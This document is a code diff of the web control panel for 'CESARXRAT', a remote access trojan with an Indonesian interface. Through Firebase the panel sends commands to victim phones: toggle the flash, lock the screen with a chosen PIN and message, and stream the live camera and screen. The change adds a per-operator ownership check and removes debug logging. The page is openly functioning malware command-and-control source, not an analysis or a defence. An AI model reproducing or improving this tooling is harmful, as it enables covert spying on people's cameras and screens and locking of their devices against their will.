@@ -4,13 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RAT Control - CESARXRAT</title>
-    <link rel="stylesheet" href="style.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0e27; color: #e0e8ff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0; padding: 0; display: block; min-height: 100vh;
+            min-height: 100vh;
         }
         .rat-container { max-width: 480px; margin: auto; padding: 20px 16px; }
         .rat-header {
@@ -18,27 +17,26 @@
             align-items: center; margin-bottom: 16px;
         }
         .rat-header h1 {
-            font-size: 28px; color: #4a9eff; margin: 0;
+            font-size: 26px; color: #4a9eff; margin: 0;
             font-weight: 800; letter-spacing: 1px;
-            text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
         }
-        .rat-header .status-badge {
-            color: #4ae0a0; font-size: 14px; font-weight: bold;
+        .status-badge {
+            color: #4ae0a0; font-size: 13px; font-weight: bold;
             background: rgba(74, 224, 160, 0.15);
-            padding: 6px 16px; border-radius: 50px;
+            padding: 6px 14px; border-radius: 50px;
             border: 1px solid #4ae0a0;
             display: flex; align-items: center; gap: 6px;
         }
-        .rat-header .status-badge.offline {
+        .status-badge.offline {
             color: #ff6b6b; background: rgba(255, 107, 107, 0.15);
             border-color: #ff6b6b;
         }
-        .rat-header .status-badge .dot {
+        .status-badge .dot {
             width: 8px; height: 8px; border-radius: 50%;
             background: #4ae0a0; display: inline-block;
             animation: pulse 1.5s infinite;
         }
-        .rat-header .status-badge.offline .dot { background: #ff6b6b; animation: none; }
+        .status-badge.offline .dot { background: #ff6b6b; animation: none; }
         @keyframes pulse {
             0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; }
         }
@@ -47,7 +45,6 @@
             border-radius: 20px; padding: 18px 20px;
             margin: 12px 0 20px 0; border: 1px solid #2a4a8a;
             display: flex; align-items: center; gap: 14px;
-            box-shadow: 0 8px 25px rgba(74, 158, 255, 0.15);
         }
         .device-info .icon {
             font-size: 40px; background: #0a0e27; padding: 12px;
@@ -56,27 +53,20 @@
         }
         .device-info .detail { flex: 1; }
         .device-info .detail .name {
-            font-size: 20px; font-weight: bold; color: #fff; letter-spacing: 0.5px;
+            font-size: 18px; font-weight: bold; color: #fff;
         }
         .device-info .detail .os {
-            font-size: 14px; color: #8899dd; margin-top: 4px;
-        }
-        .device-info .detail .tweak {
-            font-size: 12px; color: #4a9eff;
-            background: rgba(74, 158, 255, 0.15);
-            padding: 3px 14px; border-radius: 50px;
-            display: inline-block; margin-top: 6px;
-            border: 1px solid #4a9eff;
+            font-size: 13px; color: #8899dd; margin-top: 4px;
         }
         .section-title {
-            color: #8899dd; font-size: 14px; text-transform: uppercase;
+            color: #8899dd; font-size: 13px; text-transform: uppercase;
             letter-spacing: 1px; margin: 20px 0 12px 0;
             border-bottom: 1px solid #2a4a8a; padding-bottom: 6px;
             font-weight: 600;
         }
         .grid-control {
             display: grid; grid-template-columns: 1fr 1fr;
-            gap: 14px; margin-top: 10px;
+            gap: 14px;
         }
         .control-box {
             background: #111a3a; border-radius: 18px;
@@ -92,11 +82,6 @@
             font-weight: 600; color: #c0d0ff; font-size: 14px;
             display: block; margin-bottom: 10px;
         }
-        .control-box .label span {
-            font-size: 12px; color: #ff6b6b;
-            display: block; margin-top: 2px;
-        }
-        .control-box .label span.on { color: #4ae0a0; }
         .switch-lg {
             position: relative; display: inline-block;
             width: 48px; height: 26px;
@@ -139,84 +124,57 @@
             text-align: center; font-size: 16px;
         }
         .btn-back:hover { background: #4a9eff; color: #fff; }
-
-        /* Modal Dialog */
         .modal-overlay {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.85);
-            z-index: 9999;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
+            z-index: 9999; display: none;
+            justify-content: center; align-items: center; padding: 20px;
         }
-        .modal-overlay.active {
-            display: flex;
-        }
+        .modal-overlay.active { display: flex; }
         .modal-box {
-            background: #111a3a;
-            border-radius: 20px;
-            padding: 24px;
-            border: 1px solid #4a9eff;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 0 40px rgba(74, 158, 255, 0.4);
+            background: #111a3a; border-radius: 20px;
+            padding: 24px; border: 1px solid #4a9eff;
+            max-width: 400px; width: 100%;
         }
         .modal-box h2 {
-            color: #4a9eff;
-            font-size: 20px;
-            margin-bottom: 16px;
-            text-align: center;
+            color: #4a9eff; font-size: 20px;
+            margin-bottom: 16px; text-align: center;
         }
         .modal-box label {
-            display: block;
-            color: #c0d0ff;
-            font-size: 14px;
-            margin-bottom: 6px;
-            margin-top: 14px;
+            display: block; color: #c0d0ff;
+            font-size: 14px; margin-bottom: 6px; margin-top: 14px;
         }
         .modal-box input {
-            width: 100%;
-            padding: 12px 14px;
-            background: #0a0e27;
-            border: 1px solid #2a4a8a;
-            border-radius: 10px;
-            color: #e0e8ff;
-            font-size: 15px;
-            box-sizing: border-box;
-            outline: none;
+            width: 100%; padding: 12px 14px;
+            background: #0a0e27; border: 1px solid #2a4a8a;
+            border-radius: 10px; color: #e0e8ff;
+            font-size: 15px; box-sizing: border-box; outline: none;
         }
-        .modal-box input:focus {
-            border-color: #4a9eff;
-        }
+        .modal-box input:focus { border-color: #4a9eff; }
         .modal-box .btn-row {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
+            display: flex; gap: 10px; margin-top: 20px;
         }
         .modal-box .btn-cancel {
-            flex: 1;
-            padding: 12px;
-            background: transparent;
-            border: 2px solid #ff6b6b;
-            color: #ff6b6b;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 14px;
+            flex: 1; padding: 12px;
+            background: transparent; border: 2px solid #ff6b6b;
+            color: #ff6b6b; border-radius: 50px;
+            font-weight: bold; cursor: pointer; font-size: 14px;
         }
         .modal-box .btn-confirm {
-            flex: 1;
-            padding: 12px;
+            flex: 1; padding: 12px;
             background: linear-gradient(135deg, #4a9eff, #1a5bbf);
-            border: none;
-            color: #fff;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 14px;
+            border: none; color: #fff; border-radius: 50px;
+            font-weight: bold; cursor: pointer; font-size: 14px;
+        }
+        .denied-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #ff6b6b;
+        }
+        .denied-state .icon {
+            font-size: 64px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
@@ -230,71 +188,75 @@
             </span>
         </div>
 
-        <div class="device-info">
-            <div class="icon">📱</div>
-            <div class="detail">
-                <div class="name" id="deviceName">Memuat...</div>
-                <div class="os" id="deviceOs">- - -</div>
-                <div class="tweak" id="deviceTweak" style="display:none;">Tweak: -</div>
+        <div id="controlSection" style="display:none;">
+            <div class="device-info">
+                <div class="icon">📱</div>
+                <div class="detail">
+                    <div class="name" id="deviceName">Memuat...</div>
+                    <div class="os" id="deviceOs">- - -</div>
+                </div>
             </div>
+
+            <div class="section-title">REMOTE KONTROL</div>
+
+            <div class="grid-control">
+                <div class="control-box">
+                    <div class="icon">💡</div>
+                    <span class="label">Flash</span>
+                    <label class="switch-lg">
+                        <input type="checkbox" id="flash" disabled>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="control-box">
+                    <div class="icon">🔒</div>
+                    <span class="label">Lock Device</span>
+                    <label class="switch-lg">
+                        <input type="checkbox" id="lock" disabled>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="control-box">
+                    <div class="icon">📷</div>
+                    <span class="label">Live Camera</span>
+                    <label class="switch-lg">
+                        <input type="checkbox" id="camera" disabled>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="control-box">
+                    <div class="icon">🖥️</div>
+                    <span class="label">Live Screen</span>
+                    <label class="switch-lg">
+                        <input type="checkbox" id="screen" disabled>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="last-command">
+                <span>📤 Perintah terakhir:</span>
+                <span class="val" id="lastCommand">-</span>
+            </div>
+
+            <button class="btn-back" onclick="history.back()">Kembali</button>
         </div>
 
-        <div class="section-title">REMOTE KONTROL</div>
-
-        <div class="grid-control">
-            <div class="control-box">
-                <div class="icon">💡</div>
-                <span class="label">Flash <span id="flashStatus">OFF</span></span>
-                <label class="switch-lg">
-                    <input type="checkbox" id="flash" disabled>
-                    <span class="slider"></span>
-                </label>
-            </div>
-            <div class="control-box">
-                <div class="icon">🔒</div>
-                <span class="label">Lock Device <span id="lockStatus">OFF</span></span>
-                <label class="switch-lg">
-                    <input type="checkbox" id="lock" disabled>
-                    <span class="slider"></span>
-                </label>
-            </div>
-            <div class="control-box">
-                <div class="icon">📷</div>
-                <span class="label">Live Camera <span id="cameraStatus">OFF</span></span>
-                <label class="switch-lg">
-                    <input type="checkbox" id="camera" disabled>
-                    <span class="slider"></span>
-                </label>
-            </div>
-            <div class="control-box">
-                <div class="icon">🖥️</div>
-                <span class="label">Live Screen <span id="screenStatus">OFF</span></span>
-                <label class="switch-lg">
-                    <input type="checkbox" id="screen" disabled>
-                    <span class="slider"></span>
-                </label>
-            </div>
+        <div id="deniedSection" class="denied-state" style="display:none;">
+            <div class="icon">🚫</div>
+            <h2>Akses Ditolak</h2>
+            <p style="margin-top:10px;">Device ini bukan milik akun Anda.</p>
+            <button class="btn-back" style="margin-top:30px;" onclick="location.href='device-target.html'">← Kembali ke Device Target</button>
         </div>
-
-        <div class="last-command">
-            <span>📤 Perintah terakhir:</span>
-            <span class="val" id="lastCommand">-</span>
-        </div>
-
-        <button class="btn-back" onclick="history.back()">Kembali</button>
     </div>
 
-    <!-- MODAL DIALOG LOCK CUSTOM -->
     <div class="modal-overlay" id="lockModal">
         <div class="modal-box">
             <h2>🔒 Lock Device</h2>
-
             <label>PIN Unlock (4 digit)</label>
             <input type="number" id="inputPin" maxlength="4" placeholder="Contoh: 1234">
-
             <label>Pesan Lock</label>
-            <input type="text" id="inputMessage" maxlength="100" placeholder="Contoh: Jangan pakai HP ini!">
-
+            <input type="text" id="inputMessage" maxlength="100" placeholder="Perangkat terkunci">
             <div class="btn-row">
                 <button class="btn-cancel" onclick="closeLockModal()">BATAL</button>
                 <button class="btn-confirm" onclick="confirmLock()">KUNCI</button>
@@ -303,90 +265,90 @@
     </div>
 
     <script type="module">
-        import { db, ref, onValue, set } from './firebase-config.js';
+        import { auth, onAuthStateChanged, db, ref, onValue, set } from './firebase-config.js';
 
-        // ===== AMBIL TARGET ID DARI URL =====
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('target');
 
-        console.log('[RAT] Target ID:', targetId);
-
         if (!targetId) {
-            alert('Target tidak ditemukan di URL! Kembali ke Device Target.');
+            alert('Target tidak ditemukan!');
             window.location.href = 'device-target.html';
         }
 
-        const targetRef = ref(db, 'targets/' + targetId);
+        let currentUid = null;
         let currentTargetOnline = false;
+        let hasAccess = false;
 
-        // ===== LISTEN STATUS TARGET =====
-        onValue(targetRef, (snapshot) => {
-            const target = snapshot.val();
-            const statusBadge = document.getElementById('statusBadge');
-            const statusText = document.getElementById('statusText');
-            const deviceName = document.getElementById('deviceName');
-            const deviceOs = document.getElementById('deviceOs');
-            const deviceTweak = document.getElementById('deviceTweak');
-
-            if (!target) {
-                statusBadge.classList.add('offline');
-                statusText.textContent = 'OFFLINE';
-                deviceName.textContent = 'Target tidak ditemukan';
-                deviceOs.textContent = 'ID: ' + targetId;
-                currentTargetOnline = false;
-                disableAllSwitches();
+        onAuthStateChanged(auth, (user) => {
+            if (!user) {
+                window.location.href = 'login.html';
                 return;
             }
-
-            const now = Date.now();
-            const diff = target.timestamp ? (now - target.timestamp) : 999999;
-            const isOnline = diff < 30000 && target.status === 'online';
-            currentTargetOnline = isOnline;
-
-            if (isOnline) {
-                statusBadge.classList.remove('offline');
-                statusText.textContent = 'ONLINE';
-            } else {
-                statusBadge.classList.add('offline');
-                statusText.textContent = 'OFFLINE';
-            }
-
-            deviceName.textContent = target.name || 'Perangkat Target';
-            deviceOs.textContent = target.os || '- - -';
-
-            if (target.tweak) {
-                deviceTweak.style.display = 'inline-block';
-                deviceTweak.textContent = 'Tweak: ' + target.tweak;
-            } else {
-                deviceTweak.style.display = 'none';
-            }
-
-            document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                cb.disabled = !isOnline;
-            });
+            currentUid = user.uid;
+            checkAccessAndLoad();
         });
 
-        function disableAllSwitches() {
-            document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                cb.disabled = true;
-                cb.checked = false;
-            });
-            document.querySelectorAll('.control-box .label span').forEach(el => {
-                el.textContent = 'OFF';
-                el.className = '';
+        function checkAccessAndLoad() {
+            const targetRef = ref(db, 'targets/' + targetId);
+
+            onValue(targetRef, (snapshot) => {
+                const target = snapshot.val();
+
+                if (!target) {
+                    document.getElementById('deviceName').textContent = 'Target tidak ditemukan';
+                    return;
+                }
+
+                if (target.owner_uid !== currentUid) {
+                    document.getElementById('controlSection').style.display = 'none';
+                    document.getElementById('deniedSection').style.display = 'block';
+                    hasAccess = false;
+                    return;
+                }
+
+                hasAccess = true;
+                document.getElementById('controlSection').style.display = 'block';
+                document.getElementById('deniedSection').style.display = 'none';
+
+                const statusBadge = document.getElementById('statusBadge');
+                const statusText = document.getElementById('statusText');
+                const deviceName = document.getElementById('deviceName');
+                const deviceOs = document.getElementById('deviceOs');
+
+                const now = Date.now();
+                const diff = target.timestamp ? (now - target.timestamp) : 999999;
+                const isOnline = diff < 30000 && target.status === 'online';
+                currentTargetOnline = isOnline;
+
+                if (isOnline) {
+                    statusBadge.classList.remove('offline');
+                    statusText.textContent = 'ONLINE';
+                } else {
+                    statusBadge.classList.add('offline');
+                    statusText.textContent = 'OFFLINE';
+                }
+
+                deviceName.textContent = target.name || 'Perangkat Target';
+                deviceOs.textContent = target.os || '- - -';
+
+                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                    cb.disabled = !isOnline;
+                });
             });
         }
 
-        // ===== KIRIM PERINTAH =====
         function sendCommand(command) {
             if (!currentTargetOnline) {
-                alert('❌ Target offline! Tunggu sampai online.');
+                alert('❌ Target offline!');
                 return;
             }
-            console.log('[RAT] Kirim command:', command);
+            if (!hasAccess) {
+                alert('❌ Akses ditolak!');
+                return;
+            }
+
             set(ref(db, 'targets/' + targetId + '/command'), command)
                 .then(() => {
-                    console.log('[RAT] ✅ Berhasil:', command);
                     document.getElementById('lastCommand').textContent = command;
                 })
                 .catch((error) => {
@@ -394,20 +356,6 @@
                 });
         }
 
-        // ===== UPDATE STATUS SWITCH =====
-        function updateStatus(checkboxId, statusId) {
-            const checkbox = document.getElementById(checkboxId);
-            const statusSpan = document.getElementById(statusId);
-            if (checkbox.checked) {
-                statusSpan.textContent = 'ON';
-                statusSpan.className = 'on';
-            } else {
-                statusSpan.textContent = 'OFF';
-                statusSpan.className = '';
-            }
-        }
-
-        // ===== MODAL LOCK =====
         const lockModal = document.getElementById('lockModal');
         const inputPin = document.getElementById('inputPin');
         const inputMessage = document.getElementById('inputMessage');
@@ -421,17 +369,15 @@
 
         window.closeLockModal = function() {
             lockModal.classList.remove('active');
-            // Reset switch karena user batal
             lockCheckbox.checked = false;
-            updateStatus('lock', 'lockStatus');
-        }
+        };
 
         window.confirmLock = function() {
             const pin = inputPin.value.trim();
             const message = inputMessage.value.trim();
 
             if (!/^\d{4}$/.test(pin)) {
-                alert('❌ PIN harus 4 digit angka!');
+                alert('❌ PIN harus 4 digit!');
                 return;
             }
 
@@ -442,43 +388,31 @@
 
             const cmd = "LOCK_CUSTOM|" + pin + "|" + message;
             sendCommand(cmd);
-
             lockModal.classList.remove('active');
-            updateStatus('lock', 'lockStatus');
-        }
+        };
 
-        // ===== PASANG LISTENER SWITCH =====
         const controls = [
-            { checkbox: 'flash', status: 'flashStatus', command: 'FLASH' },
-            { checkbox: 'lock', status: 'lockStatus', command: 'LOCK' },
-            { checkbox: 'camera', status: 'cameraStatus', command: 'CAMERA' },
-            { checkbox: 'screen', status: 'screenStatus', command: 'SCREEN' }
+            { checkbox: 'flash', command: 'FLASH' },
+            { checkbox: 'lock', command: 'LOCK' },
+            { checkbox: 'camera', command: 'CAMERA' },
+            { checkbox: 'screen', command: 'SCREEN' }
         ];
 
         controls.forEach(function(item) {
             const checkboxEl = document.getElementById(item.checkbox);
 
             checkboxEl.addEventListener('change', function() {
-                console.log('[RAT] Switch ' + item.checkbox + ':', this.checked);
-
                 if (item.command === 'LOCK') {
-                    // Khusus LOCK
                     if (this.checked) {
                         openLockModal();
                     } else {
-                        // Unlock
                         sendCommand('LOCK_OFF');
-                        updateStatus('lock', 'lockStatus');
                     }
                 } else {
-                    // Fitur lain (Flash, Camera, Screen)
                     const cmd = item.command + (this.checked ? '_ON' : '_OFF');
                     sendCommand(cmd);
-                    updateStatus(item.checkbox, item.status);
                 }
             });
-
-            updateStatus(item.checkbox, item.status);
         });
 
         console.log('[CESARXRAT] RAT Control siap');
